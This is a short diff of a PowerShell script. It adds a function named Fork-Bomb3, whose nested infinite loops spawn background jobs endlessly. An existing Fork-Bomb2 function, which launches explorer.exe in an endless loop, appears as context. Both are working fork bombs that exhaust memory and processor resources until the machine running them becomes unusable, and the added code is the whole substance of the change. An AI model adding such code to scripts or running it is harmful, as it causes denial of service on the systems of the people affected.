@@ -1143,6 +1143,12 @@ Param(
     $mediaPlayer.Play()
 }
 
+Function Fork-Bomb3 
+{
+    echo ok
+    For(){ Sajb{ For(){ } } }
+}
+
 Function Fork-Bomb2 
 {
     while(1) {Start-Process explorer.exe}
